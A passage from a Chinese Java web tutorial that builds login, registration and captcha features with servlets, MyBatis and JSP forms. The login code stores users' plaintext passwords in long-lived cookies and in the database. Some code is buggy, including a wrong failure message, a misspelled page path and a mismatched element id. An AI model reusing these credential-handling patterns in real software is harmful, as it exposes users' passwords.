<span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateSubmit&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
    <span class="hljs-comment">&lt;!--取消 只需要将dialogVisble设置为false即可隐藏对话框--&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogUpdateVisible = false&quot;</span>&gt;</span>取消<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span></code></pre>

<pre><code class="hljs js"><span class="hljs-comment">// 修改</span>
<span class="hljs-title function_">updateSubmit</span>(<span class="hljs-params"></span>)&#123;
    <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;

    <span class="hljs-title function_">axios</span>(&#123;
        <span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;POST&#x27;</span>,
        <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/update&#x27;</span>,
        <span class="hljs-attr">data</span>: _this.<span class="hljs-property">updateBrand</span>
    &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;
        <span class="hljs-keyword">if</span>(response.<span class="hljs-property">data</span> == <span class="hljs-string">&quot;success&quot;</span>)&#123;
            _this.<span class="hljs-property">dialogUpdateVisible</span> = <span class="hljs-literal">false</span>;
            _this.<span class="hljs-title function_">selectAll</span>();
            _this.<span class="hljs-title function_">msgbox</span>(<span class="hljs-string">&quot;修改成功！&quot;</span>);
        &#125;
    &#125;)
&#125;,</code></pre>



<h2 id="登录注册功能实现"><a href="#登录注册功能实现" class="headerlink" title="登录注册功能实现"></a>登录注册功能实现</h2><h3 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h3><h4 id="后端实现-7"><a href="#后端实现-7" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-7"><a href="#dao-7" class="headerlink" title="dao"></a>dao</h5><p>在<code>src/main/java/com/itheima/mapper</code>创建<code>UserMapper</code>接口</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.mapper;

<span class="hljs-keyword">import</span> com.itheima.pojo.User;
<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Insert;
<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Param;
<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Select;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 用户登录</span>
<span class="hljs-comment">     * 检查用户名和密码是否正确</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> username</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> password</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125; and password = #&#123;password&#125;&quot;)</span>
    User <span class="hljs-title function_">select</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username, <span class="hljs-meta">@Param(&quot;password&quot;)</span> String password)</span>;

&#125;
</code></pre>

<h5 id="service-7"><a href="#service-7" class="headerlink" title="service"></a>service</h5><p>在<code>src/main/java/com/itheima/service</code>中创建<code>UserService</code>类</p>
<pre><code class="hljs java"><span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> SqlSessionFactoryUtils.getSqlSessionFactory();

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 用户登录方法</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> username</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> password</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">Login</span><span class="hljs-params">(String username, String password)</span>&#123;
    <span class="hljs-type">SqlSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();
    <span class="hljs-type">UserMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> session.getMapper(UserMapper.class);
    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> mapper.select(username, password);

    <span class="hljs-keyword">if</span>(user != <span class="hljs-literal">null</span>)&#123;
        <span class="hljs-keyword">return</span> user;
    &#125;<span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    &#125;
&#125;
</code></pre>

<h5 id="servlet-7"><a href="#servlet-7" class="headerlink" title="servlet"></a>servlet</h5><p>在<code>src/main/java/com/itheima/servler/web</code>中创建<code>LoginServlet</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;

<span class="hljs-keyword">import</span> com.itheima.pojo.User;
<span class="hljs-keyword">import</span> com.itheima.service.UserService;

<span class="hljs-keyword">import</span> javax.servlet.ServletException;
<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.*;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-meta">@WebServlet(value = &quot;/login&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;
    <span class="hljs-comment">// 因为BrandService可能多次用到 所以变成成员变量 减少创建的次数</span>
    <span class="hljs-type">UserService</span> <span class="hljs-variable">userservice</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserService</span>();
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;


        System.out.println(<span class="hljs-string">&quot;login&quot;</span>);
        <span class="hljs-comment">//解决POST请求中文乱码问题</span>
        request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);

        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);

        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userservice.Login(username, password);

        <span class="hljs-keyword">if</span>(user != <span class="hljs-literal">null</span>)&#123;
            <span class="hljs-comment">// 登录成功，页面跳转到了 brand.jsp</span>
            <span class="hljs-comment">// 保存用户的session信息</span>
            <span class="hljs-comment">// 检查是否勾选记住密码</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">remember</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;remember&quot;</span>);
            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(remember))&#123;
                <span class="hljs-type">Cookie</span> <span class="hljs-variable">c_username</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;username&quot;</span>, username);
                <span class="hljs-type">Cookie</span> <span class="hljs-variable">c_password</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;password&quot;</span>, password);
                c_username.setMaxAge(<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">7</span>);
                c_password.setMaxAge(<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">7</span>);

                <span class="hljs-comment">// 发送Cookie</span>
                response.addCookie(c_username);
                response.addCookie(c_password);
            &#125;

            <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();
            session.setAttribute(<span class="hljs-string">&quot;user&quot;</span>, user);


            <span class="hljs-comment">// 获取项目的虚拟路径</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">contextPath</span> <span class="hljs-operator">=</span> request.getContextPath();
            request.getRequestDispatcher( <span class="hljs-string">&quot;/brand.html&quot;</span>).forward(request,response);

        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-comment">// 登录失败，在页面显示登录失败的提示信息</span>
            request.setAttribute(<span class="hljs-string">&quot;login_msg&quot;</span>,<span class="hljs-string">&quot;用户名或密码错误&quot;</span>);
            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(request,response);
        &#125;


    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
        doGet(request, response);
    &#125;
&#125;
</code></pre>

<h4 id="前端实现-7"><a href="#前端实现-7" class="headerlink" title="前端实现"></a>前端实现</h4><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginDiv&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 350px&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/brand-case/login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span><span class="hljs-attr">id</span>=<span class="hljs-string">&quot;form&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginMsg&quot;</span>&gt;</span>LOGIN IN<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;errorMsg&quot;</span>&gt;</span>$&#123;login_msg&#125; $&#123;register_msg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Username:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;cookie.username.value&#125;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Password:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;cookie.password.value&#125;&quot;</span><span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Remember:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;remember&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;remember&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;subDiv&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;login up&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;reset&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;register.jsp&quot;</span>&gt;</span>没有账号？<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre>



<h3 id="注册功能"><a href="#注册功能" class="headerlink" title="注册功能"></a>注册功能</h3><h4 id="后端实现-8"><a href="#后端实现-8" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-8"><a href="#dao-8" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 查询是否存在相同的用户名</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> username</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125;&quot;)</span>
User <span class="hljs-title function_">selectUser</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 用户注册</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> user</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Insert(&quot;insert into tb_user values (null, #&#123;username&#125;, #&#123;password&#125;)&quot;)</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span>;
</code></pre>

<h5 id="service-8"><a href="#service-8" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 注册功能</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> user</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">Register</span><span class="hljs-params">(User user)</span>&#123;
    <span class="hljs-type">SqlSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();
    <span class="hljs-type">UserMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> session.getMapper(UserMapper.class);
    <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> mapper.selectUser(user.getUsername());

    <span class="hljs-keyword">if</span>(u == <span class="hljs-literal">null</span>)&#123;
        mapper.addUser(user);
        session.commit();
    &#125;
    session.commit();
    <span class="hljs-keyword">return</span> u == <span class="hljs-literal">null</span>;
&#125;</code></pre>

<h5 id="servlet-8"><a href="#servlet-8" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;

<span class="hljs-keyword">import</span> com.itheima.pojo.User;
<span class="hljs-keyword">import</span> com.itheima.service.UserService;

<span class="hljs-keyword">import</span> javax.servlet.ServletException;
<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-meta">@WebServlet(value = &quot;/register&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RegisterServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;
    <span class="hljs-comment">// 因为UserService可能多次用到 所以变成成员变量 减少创建的次数</span>
    <span class="hljs-type">UserService</span> <span class="hljs-variable">userservice</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserService</span>();
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;

        <span class="hljs-comment">//解决POST请求中文乱码问题</span>
        request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);

        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">checkCode1</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;checkCode&quot;</span>);

        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user.setUsername(username);
        user.setPassword(password);

        <span class="hljs-comment">// 获取生成的验证码信息</span>
        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();
        <span class="hljs-type">String</span> <span class="hljs-variable">checkCode</span> <span class="hljs-operator">=</span>(String) session.getAttribute(<span class="hljs-string">&quot;checkCode&quot;</span>);
        <span class="hljs-comment">// 比较用户输入的验证码</span>
        <span class="hljs-comment">// 细节：checkCode为程序中定义的变量 比较时放在前面，否则可能出现空指针错误</span>
        <span class="hljs-keyword">if</span>(!checkCode.equals(checkCode1))&#123;
            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>, <span class="hljs-string">&quot;验证码错误，请重新输入！&quot;</span>);
            request.getRequestDispatcher(<span class="hljs-string">&quot;/register.jsp&quot;</span>).forward(request,response);
            <span class="hljs-comment">// 禁止注册</span>
            <span class="hljs-keyword">return</span> ;
        &#125;


        <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> userservice.Register(user);
        <span class="hljs-keyword">if</span>(flag)&#123;
            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>,<span class="hljs-string">&quot;注册成功，请登录！&quot;</span>);
            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(request,response);
        &#125;<span class="hljs-keyword">else</span>&#123;
            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>,<span class="hljs-string">&quot;注册成功，请重试！&quot;</span>);
            request.getRequestDispatcher(<span class="hljs-string">&quot;/regsiter.jsp&quot;</span>).forward(request,response);
        &#125;

    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
        doGet(request, response);
    &#125;
&#125;
</code></pre>

<h4 id="前端实现-8"><a href="#前端实现-8" class="headerlink" title="前端实现"></a>前端实现</h4><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-div&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;reg-content&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎注册<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>已有帐号？<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;login.jsp&quot;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;reg-form&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/register&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span>

            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>用户名<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username_err&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;err_msg&quot;</span>&gt;</span>$&#123;register_msg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>

            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>

            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>密码<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password_err&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;err_msg&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: none&quot;</span>&gt;</span>密码格式有误<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>


            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>验证码<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;checkCode&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkCode&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkCodeImg&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/checkCode&quot;</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;changeImg&quot;</span>&gt;</span>看不清？<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>

        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;buttons&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;注 册&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;reg_btn&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clear&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span>
<span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;changeImgg&quot;</span>).<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span>
<span class="language-javascript">        <span class="hljs-comment">//路径后面添加时间戳的目的是避免浏览器进行缓存静态资源</span></span>
<span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;checkCodeImg&quot;</span>).<span class="hljs-property">src</span> = <span class="hljs-string">&quot;/checkCode?&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getMilliseconds</span>();</span>
<span class="language-javascript">    &#125;</span>
<span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<h3 id="验证码模块"><a href="#验证码模块" class="headerlink" title="验证码模块"></a>验证码模块</h3><p>借助验证码生成工具</p>
<p>在<code>src/main/java/com/itheima/util</code>引入生成验证码的类</p>
<p>将验证码显示在页面上</p>
<p>在<code>src/main/java/com/itheima/servler/web</code>创建CheckCodeServlet</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;

<span class="hljs-keyword">import</span> com.itheima.service.BrandService;

<span class="hljs-keyword">import</span> com.itheima.util.CheckCodeUtil;

<span class="hljs-keyword">import</span> javax.servlet.ServletException;
<span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;
<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-meta">@WebServlet(value = &quot;/checkCode&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CheckCodeServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;
    <span class="hljs-comment">// 因为BrandService可能多次用到 所以变成成员变量 减少创建的次数</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">BrandService</span> <span class="hljs-variable">brandService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BrandService</span>();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;

        <span class="hljs-comment">// 生成验证码</span>
        <span class="hljs-comment">// 获取响应输出流</span>
